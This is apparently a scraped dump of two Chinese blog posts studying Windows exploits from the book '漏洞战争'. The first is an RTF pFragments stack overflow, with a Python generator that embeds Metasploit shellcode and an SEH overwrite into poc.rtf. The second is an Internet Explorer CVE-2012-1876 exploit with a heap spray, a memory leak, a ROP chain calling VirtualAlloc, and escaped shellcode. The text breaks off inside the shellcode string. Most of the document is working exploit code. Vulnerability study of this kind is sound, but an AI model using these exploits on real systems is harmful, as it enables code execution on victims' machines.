33 41 64-34 41 64 35 41 64 36 41 Ad2Ad3Ad4Ad5Ad6A0011fe9c 64 37 41 64 38 41 64 39-41 65 30 41 65 31 41 65 d7Ad8Ad9Ae0Ae1Ae 一般情况下，[ebp+4]存储着函数返回地址，调用之前[ebp+4]存储的是f4 96 e5 32，调用之后存储的是36 41 61 37。（此事说明了溢出发生） 现在，回到书上看看，32e595a1的上下内容跟书上40页讲的一致。 跟书上不一样的原因应该是，我的栈有足够大的空间容纳这些字符串，而书上没有，所以书上在memcpy就触发了异常，而我的跑到mov ecx,dword ptr [eax+4]才抛出异常。在书的44页也有讲到mov ecx,dword ptr [eax+4]这个诡异的运算。 EXPexp.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869# -*- coding:utf-8 -*-from __future__ import unicode_literalsfrom mako.template import Template# windows/exec - 189 bytes# http://www.metasploit.com# VERBOSE=false, PrependMigrate=false, EXITFUNC=process,# CMD=calcbuf = \"\"buf += \"fce8820000006089e531c0648b\"buf += \"50308b520c8b52148b72280fb7\"buf += \"4a2631ffac3c617c022c20c1cf\"buf += \"0d01c7e2f252578b52108b4a3c\"buf += \"8b4c1178e34801d1518b592001\"buf += \"d38b4918e33a498b348b01d631\"buf += \"ffacc1cf0d01c738e075f6037d\"buf += \"f83b7d2475e4588b582401d366\"buf += \"8b0c4b8b581c01d38b048b01d0\"buf += \"894424245b5b61595a51ffe05f\"buf += \"5f5a8b12eb8d5d6a018d85b200\"buf += \"00005068318b6f87ffd5bbf0b5\"buf += \"a25668a695bd9dffd53c067c0a\"buf += \"80fbe07505bb4713726f6a0053\"buf += \"ffd563616c6300\"def encode_int(v): array = format(v, 'x') if not len(array) % 2: array = '0' + array return ''.join(array[i-2:i] for i in xrange(len(array), 0, -2))length = 0xc8acexp = '1' * 0x10 * 2exp += '1' * 4 * 2# 函数返回地址的位置，放置jmp esp的地址#exp += encode_int(0x76a7068d)exp += '90909090'exp += '2' * 0x10 * 2# ebp + 0x18 = 0 跳过诡异的运算#exp += '0' * 8exp += '1' * 8 # 异常# jmp espexp += buf# 到异常链的填充exp += '3' * (0x1718 - len(buf)/2) * 2# next SEHexp += 'eb06ebf8'# SEH Handleexp += '0b0b2800'# jmp shellcodeexp += 'e9dbe8ffff'exp += '1' * (length - len(exp))t = Template(filename='./template.txt')ttf = t.render(length=encode_int(length), content=exp)with open('poc.rtf', 'w') as f: f.write(ttf) template.txt1&#123;\\rtf1&#123;\\shp&#123;\\sp&#123;\\sn pFragments&#125;&#123;\\sv 1;7;11111111$&#123;length&#125;$&#123;content&#125;&#125;&#125;&#125;&#125;","tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://www.ench4nt3r.com/tags/漏洞分析/"},{"name":"漏洞战争","slug":"漏洞战争","permalink":"http://www.ench4nt3r.com/tags/漏洞战争/"}]},{"title":"Cve-2012-1876 exploit","date":"2016-11-19T16:00:00.000Z","path":"2016/11/20/Cve-2012-1876-exploit/","text":"《漏洞战争》第三章中有讲Cve-2012-1876，书上带的exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156&lt;html&gt;&lt;body&gt;&lt;div id=\"test\"&gt;&lt;/div&gt;&lt;script language='javascript'&gt; var leak_index = -1;var dap = \"EEEE\";while ( dap.length &lt; 480 ) dap += dap;var padding = \"AAAA\";while ( padding.length &lt; 480 ) padding += padding;var filler = \"BBBB\";while ( filler.length &lt; 480 ) filler += filler;//sprayvar arr = new Array();var rra = new Array();var div_container = document.getElementById(\"test\");div_container.style.cssText = \"display:none\";for (var i=0; i &lt; 500; i+=2) &#123; // E rra[i] = dap.substring(0, (0x100-6)/2); // S, bstr = A arr[i] = padding.substring(0, (0x100-6)/2); // A, bstr = B arr[i+1] = filler.substring(0, (0x100-6)/2); // B var obj = document.createElement(\"button\"); div_container.appendChild(obj);&#125;for (var i=200; i&lt;500; i+=2 ) &#123; rra[i] = null; CollectGarbage();&#125;&lt;/script&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"0\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"1\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"2\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"3\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"4\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"5\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"6\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"7\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"8\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"9\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"10\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"11\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"12\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"13\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"14\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"15\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"16\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"17\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"18\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"19\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"20\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"21\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"22\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"23\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"24\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"25\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"26\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"27\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"28\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"29\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"30\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"31\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"32\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"33\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"34\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"35\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"36\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"37\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"38\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"39\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"40\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"41\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"42\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"43\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"44\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"45\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"46\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"47\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"48\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"49\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"50\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"51\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"52\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"53\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"54\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"55\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"56\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"57\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"58\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"59\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"60\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"61\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"62\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"63\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"64\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"65\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"66\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"67\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"68\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"69\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"70\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"71\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"72\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"73\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"74\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"75\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"76\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"77\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"78\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"79\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"80\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"81\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"82\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"83\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"84\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"85\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"86\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"87\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"88\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"89\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"90\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"91\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"92\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"93\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"94\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"95\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"96\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"97\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"98\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"99\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"100\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"101\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"102\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"103\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"104\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"105\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"106\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"107\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"108\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"109\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"110\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"111\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"112\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"113\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"114\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"115\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"116\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"117\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"118\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"119\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"120\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"121\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"122\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"123\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"124\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"125\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"126\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"127\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"128\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"129\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"130\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"131\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;table style=\"table-layout:fixed\" &gt;&lt;col id=\"132\" width=\"41\" span=\"9\" &gt;&amp;nbsp &lt;/col&gt;&lt;/table&gt;&lt;script language='javascript'&gt; var obj_col = document.getElementById(\"132\"); obj_col.span = 19;function over_trigger() &#123; var leak_addr = -1; for ( var i = 0; i &lt; 500; i++ ) &#123; if ( arr[i].length &gt; (0x100-6)/2 ) &#123; // overflowed leak_index = i; var leak = arr[i].substring((0x100-6)/2+(2+8)/2, (0x100-6)/2+(2+8+4)/2); leak_addr = parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 ); mshtmlbase = leak_addr - Number(0x001582b8); alert(mshtmlbase); break; &#125; &#125; if ( leak_addr == -1 || leak_index == -1 ) &#123; alert(\"memory leak failed....\"); &#125;//return mshtmlbase;&#125;// A very special heap sprayfunction heap_spray()&#123; CollectGarbage();var heapobj = new Object();// generated with mona.py (mshtml.dll v) function rop_chain(mshtmlbase)&#123; var arr = [ mshtmlbase + Number(0x00001031), mshtmlbase + Number(0x00002c78), // pop ebp; retn mshtmlbase + Number(0x0001b4e3), // xchg eax,esp; retn (pivot) mshtmlbase + Number(0x00352c8b), // pop eax; retn mshtmlbase + Number(0x00001340), // ptr to &amp;VirtualAlloc() [IAT] mshtmlbase + Number(0x00124ade), // mov eax,[eax]; retn mshtmlbase + Number(0x000af93e), // xchg eax,esi; and al,0; xor eax,eax; retn mshtmlbase + Number(0x00455a9c), // pop ebp; retn mshtmlbase + Number(0x00128b8d), // &amp; jmp esp mshtmlbase + Number(0x00061436), // pop ebx; retn 0x00000001, // 0x00000001-&gt; ebx mshtmlbase + Number(0x0052d8a3), // pop edx; retn 0x00001000, // 0x00001000-&gt; edx mshtmlbase + Number(0x00003670), // pop ecx; retn 0x00000040, // 0x00000040-&gt; ecx mshtmlbase + Number(0x001d263d), // pop edi; retn mshtmlbase + Number(0x000032ac), // retn mshtmlbase + Number(0x00352c9f), // pop eax; retn 0x90909090, // nop mshtmlbase + Number(0x0052e805), // pushad; retn 0x90909090, 0x90909090, 0x90909090, 0x90909090, 0x90909090, ]; return arr; &#125;function d2u(dword)&#123; var uni = String.fromCharCode(dword &amp; 0xFFFF); uni += String.fromCharCode(dword&gt;&gt;16); return uni;&#125;function tab2uni(heapobj, tab)&#123; var uni = \"\" for(var i=0;i&lt;tab.length;i++)&#123; uni += heapobj.d2u(tab[i]); &#125; return uni;&#125;heapobj.tab2uni = tab2uni;heapobj.d2u = d2u;heapobj.rop_chain = rop_chain;var code = unescape(\"%u40b0%u414b%u1d24%ub4a8%u7799%ube37%ua947%ud41a%u353f%ueb30%ud133%u2ae1%u31e0%ue2d3%u1514%ufd13%u3497%u7a7b%ufc39%u92ba%u9390%u0a4e%ubbf5%u8db2%ue385%uf823%ud53a%u0448%u750d%ud632%u707c%u4642%u7e78%ub12c%u2f98%u1c3c%u727e%u3b7b%u4fe0%ue38c%u4f76%u81b0%u2de2%u35ba%u86bb%u67f8%u8d0c%u9190%u7574%u7f71%u7d3c%u9f15%ub347%ud50b%u784e%u4970%u1b37%uc1ff%uc6fe%uc0c7%ub6d4%u9246%ub4b1%uf588%ua91d%u7c4b%u2548%u7a99%u9b3d%u01b7%u34eb%u1cb5%u38a8%ub8fc%ud609%ube4a%u9714%ue121%ub904%u42b2%u7796%u6924%u80f9%u0dfd%u412c%u2f05%u273f%ubf40%u9893%u7343%u6679%u77a8%ub63f%u7472%u707b%u843d%uebd2%uf630%ubfd5%u71b2%u757a%u1848%u0cf5%u96b7%uf889%u764a%u9b2d%u92b0%u66be%u7d97%ub425%u9114%u4904%uba34%u421c%ue308%uf902%u4140%u4773%u0d27%u93b5%u2299%u1dd4%u7c4f%u2867%u98fc%u2c24%ue212%ufd03%u78a9%u3505%u8390%u2fe0%u4337%u154b%u468d%u79b9%u297f%ubbd6%u197e%u4ee1%u9fb8%ub1b3%u4a3c%u7a7d%u7679%u4670%u2091%u74e1%ub043%u4e71%ub590%u75b7%u983c%u4bb3%ud687%uf86b%u9b40%u117f%ud1f7%u7bf9%u152f%u3427%u1d92%u3d97%u2d49%u720d%u014f%u7ce0%u3105%u10eb%u35f5%ub4b6%u1c2c%u93b2%u4704%ud52b%ubbb1%ue389%u4137%u7e78%u733f%u7742%u2925%ufcd0%u6624%u8dba%u67b9%u1a96%ua8fd%ua9be%ud40b%u4899%u